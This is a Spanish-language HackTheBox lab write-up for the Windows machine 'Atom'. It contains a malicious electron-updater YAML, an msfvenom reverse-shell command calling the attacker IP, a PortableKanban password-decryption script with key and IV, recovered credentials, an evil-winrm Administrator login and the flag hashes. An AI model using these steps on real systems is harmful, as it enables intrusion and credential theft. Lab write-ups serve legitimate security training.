---
layout      : post
title       : "Maquina Atom - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Atom/atom.png
category    : [ hackthebox ]
tags        : [ SMB Enumeration, Abusing electron updater, Signature Validation Bypass RCE, Abusing PortableKanban, Redis Enumeration, Abusing WinRM ]
---

El dia de hoy vamos a resolver `Atom` de `hackthebox` una maquina `windows` de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves `electron-builder` donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de `portablekanban` y finalmente despues de una enumeración del servicio de `redis` obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario `Administrator`. 
 
Maquina curiosa asi que vamos a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Atom
❯ ls

 Atom
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.237
PING 10.10.10.237 (10.10.10.237) 56(84) bytes of data.
64 bytes from 10.10.10.237: icmp_seq=1 ttl=127 time=271 ms

--- 10.10.10.237 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 271.205/271.205/271.205/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63` y por proximidad seria correspondiente a una maquina `linux`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.237 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:35 GMT
Initiating SYN Stealth Scan at 00:35
Scanning 10.10.10.237 [65535 ports]
Discovered open port 445/tcp on 10.10.10.237
Discovered open port 80/tcp on 10.10.10.237
Discovered open port 135/tcp on 10.10.10.237
Discovered open port 443/tcp on 10.10.10.237
Discovered open port 6379/tcp on 10.10.10.237
Discovered open port 5985/tcp on 10.10.10.237
Completed SYN Stealth Scan at 00:35, 26.77s elapsed (65535 total ports)
Nmap scan report for 10.10.10.237
Host is up, received user-set (0.20s latency).
Scanned at 2023-08-11 00:35:14 GMT for 27s
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
443/tcp  open  https        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
6379/tcp open  redis        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 23 (1.012KB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p80,135,443,445,5985,6379 10.10.10.237 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:36 GMT
Nmap scan report for 10.10.10.237
Host is up (0.21s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Heed Solutions
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s
| smb2-time: 
|   date: 2023-08-11T00:37:09
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-10T17:37:13-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
```

Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 80     | HTTP     |  Apache httpd 2.4.46  |
| 135   | MSRPC     |  Microsoft Windows RPC  |
| 443   | HTTPS     | Apache httpd 2.4.46   |
| 445   | SMB     | microsoft-ds Windows 10 Pro 19042  |
| 5985   | WINRM     | Microsoft HTTPAPI httpd 2.0   |
| 6379   |   REDIS   |  Redis key-value store  |


## EXPLOTACION [#](#explotacion) {#explotacion}

Comenzamos usando `whatweb`, para determinar las tecnologias que esta usando el servicio web.

```bash
❯ whatweb 10.10.10.237
http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.237], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
```

La herramienta no nos reporta que estamos ante un `php`, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a `heed Solutions`

![](/assets/images/HTB/htb-writeup-Atom/atom1.PNG)


Ahora bien `nmap` nos reporto que el puerto `445` se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos `smbmap` de la suite de `impacket`.

```bash
❯ smbmap -H 10.10.10.237 -u 'null'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Software_Updates                                  	READ, WRITE	
```

Vemos que tenemos permiso de lectura y ejecución en `Software_Updates`, asi que vamos a listar los recursos que contiene.


```bash
❯ smbmap -H 10.10.10.237 -u 'null' -r 'Software_Updates'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Software_Updates                                  	READ, WRITE	
	.\Software_Updates\*
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	.
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	..
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client1
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client2
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client3
	fr--r--r--            35202 Fri Apr  9 11:18:08 2021	UAT_Testing_Procedures.pdf
```

Vamos a traernos a nuestra maquina y abrir el archivo pdf.

```bash
❯ smbmap -H 10.10.10.237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures.pdf'
[+] Starting download: Software_Updates\UAT_Testing_Procedures.pdf (35202 bytes)
[+] File output to: /home/fmiracle/Machines/Aton/content/10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ ls
 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ mv 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf UAT_Testing_Procedures.pdf
❯ ls
 UAT_Testing_Procedures.pdf
```

Si lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con `php`, pero tu puedes hacerlo como mas te guste.

```bash
❯ php -S 0.0.0.0:80
[Fri Aug 11 00:56:38 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started
```

![](/assets/images/HTB/htb-writeup-Atom/atom2.PNG)


Vemos que contiene información acerca de una aplicación en `electron-builder`


Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre `client` que curiosamente son los mismo cuando listamos los recursos compartidos con `smbmap`.


> Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de "actualización automática".

Si buscamos vulnerabilidades asociadas a `electron builder`, encontramos  una de evasión de la validación de firmas que conduce a `RCE` en Electron-Updater.

Basicamente esta vulnerabilidad se aprovecha de `Electron-Updater` y nos permite ejecutar codigo malicioso en el software.


Te dejo el articulo para que puedas entenderlo mejor:

* [https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)

![](/assets/images/HTB/htb-writeup-Atom/atom3.PNG)


Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión `yml`.

```bash
version: 1.2.3
path: http://10.10.16.2/test
sha512: fjqwiofhqw21321 21ie21e2r
```

En la parte de `path` vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con `ncat`. Y seguidamente vamos a subir en una de las carpetas `client` nuestro archivo `yaml`.

```bash
❯ smbclient  //10.10.10.237/Software_Updates -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Aug 11 01:18:55 2023
  ..                                  D        0  Fri Aug 11 01:18:55 2023
  client1                             D        0  Fri Aug 11 01:18:55 2023
  client2                             D        0  Fri Aug 11 01:18:55 2023
  client3                             D        0  Fri Aug 11 01:18:55 2023
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 11:18:08 2021

		4413951 blocks of size 4096. 1369525 blocks available
smb: \> cd client1
smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml (0,1 kb/s) (average 0,1 kb/s)
smb: \client1\> dir
  .                                   D        0  Fri Aug 11 01:21:33 2023
  ..                                  D        0  Fri Aug 11 01:21:33 2023
  latest.yml                          A       79  Fri Aug 11 01:21:33 2023

		4413951 blocks of size 4096. 1369525 blocks available
smb: \client1\>
```

Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad.


Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de `msfvenom` para poder obtener una reverse shell de la maquina victima.

```bash
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

Una cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo `’`

```bash
❯ mv reverse.exe r’everse.exe
❯ ls
 latest.yml   r’everse.exe   UAT_Testing_Procedures.pdf
```

Ademas debemos de modificar nuestro archivo `yml` especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable.

```bash
❯ sha512sum r’everse.exe
d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31  r’everse.exe
```

El archivo nos quedaria de la siguiente forma:

```bash
version: 1.2.3
path: r’everse.exe 
sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31
```
Procedemos a subirlo en una de las carpetas `client`, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con `ncat`. 


Recibimos la conexión como el usuario `jason`.

```bash
nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.237.
Connection from 10.10.10.237:54130.
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

whoami
whoami
atom\jason
```

Ahora podemos dirigirnos a su directorio personal y leer la primera flag `user.txt`.

```cmd
cd C:\Users\jason\Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Desktop

04/02/2021  10:29 PM    <DIR>          .
04/02/2021  10:29 PM    <DIR>          ..
03/31/2021  02:09 AM             2,353 heedv1.lnk
03/31/2021  02:09 AM             2,353 heedv2.lnk
03/31/2021  02:09 AM             2,353 heedv3.lnk
08/10/2023  05:27 PM                34 user.txt
               4 File(s)          7,093 bytes
               2 Dir(s)   5,622,317,056 bytes free

type user.txt
type user.txt
5dcbc34fb2b0acaf6f9262acb7ec960e
```

## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}


Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a `PortableKanban`.

```cmd
cd Downloads

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads

04/02/2021  08:00 AM    <DIR>          .
04/02/2021  08:00 AM    <DIR>          ..
03/31/2021  02:36 AM    <DIR>          node_modules
04/02/2021  08:21 PM    <DIR>          PortableKanban
               0 File(s)              0 bytes
               4 Dir(s)   5,622,136,832 bytes free

C:\Users\jason\Downloads>
```

Si listamos el contenido obervamos varios archivos `dll`.

```cmd
cd PortableKanban

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads\PortableKanban

04/02/2021  08:21 PM    <DIR>          .
04/02/2021  08:21 PM    <DIR>          ..
02/27/2013  08:06 AM            58,368 CommandLine.dll
11/08/2017  01:52 PM           141,312 CsvHelper.dll
06/22/2016  09:31 PM           456,704 DotNetZip.dll
04/02/2021  07:44 AM    <DIR>          Files
11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
11/23/2017  04:29 PM           376,832 MsgReader.dll
07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
04/02/2021  07:17 AM    <DIR>          Plugins
04/02/2021  08:22 PM             5,920 PortableKanban.cfg
01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
01/04/2018  09:14 PM         1,050,092 User Guide.pdf
              19 File(s)      5,656,416 bytes
               4 Dir(s)   5,625,991,168 bytes free
```

Si tratamos de buscar vulnerabilidades asociadas a `PortableKanban`, vemos un exploit con el podemos desencriptar una contraseña.

```bash
❯ searchsploit portablekanban
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
PortableKanban 4.3.6578.38136 - Encrypted Password Ret | windows/local/49409.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Vimos anteriormente cuando listamos los archivos de `portablekanban` un archivo de configuración `PortableKanban.cfg` que si lo leemos encontramos una contraseña encryptada.

```cmd
type PortableKanban.cfg
{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 9pt","SelectedViewTabForeColor":"WhiteSmoke","SelectedViewTabBackColor":"Black","HeaderFont":"Segoe UI, 11.4pt","HeaderShowCount":true,"HeaderShowLimit":true,"HeaderShowEstimates":true,"HeaderShowPoints":false,"HeaderForeColor":"WhiteSmoke","HeaderBackColor":"Gray","CardFont":"Segoe UI, 11.4pt","CardLines":3,"CardTextAlignment":"Center","CardShowMarks":true,"CardShowInitials":false,"CardShowTags":true,"ThickTags":false,"DefaultTaskForeColor":"WhiteSmoke","DefaultTaskBackColor":"Gray","SelectedTaskForeColor":
```

> Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro.


Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro.


```python
import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
```

Ejecutamos el exploit y obtenemos la contraseña en texto claro.

```bash
❯ python3 portable.py
kidvscat_yes_kidvscat
```

Podemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de `RedisServer`, asi que podemos tratar de conectarnos al servicio de `redis`.

```bash
❯ redis-cli -h 10.10.10.237
10.10.10.237:6379> auth kidvscat_yes_kidvscat
OK
```

Para poder enumerar el servicio podemos apoyarnos de `hacktricks`, te dejo el recurso aqui:

* [https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

Podemos listar las KEYS disponibles y listar 

```bash
10.10.10.237:6379> KEYS *
1) "pk:ids:User"
2) "pk:ids:MetaDataClass"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
10.10.10.237:6379> GET pk:ids:User
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379> GET pk:ids:MetaDataClass
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379> GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
```
Obtenemos una contraseña enctryptada `Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi` con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla.

```python
import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
```

Ejectamos nuevamente el exploit y obtenemos una nueva contraseña.

```bash
❯ python3 portable.py
kidvscat_admin_@123
```

Podemos a intentar con esta nueva conectarnos como el usuario `Administrator` usando `winrm`.

```bash
❯ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
atom\administrator
```

Nos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario `Administrator` y visualizar la segunda flag `root.txt`.


```cmd
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/10/2023   5:27 PM             34 root.txt


Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f55c47e3b749e8ae956f980fba1dc782
```




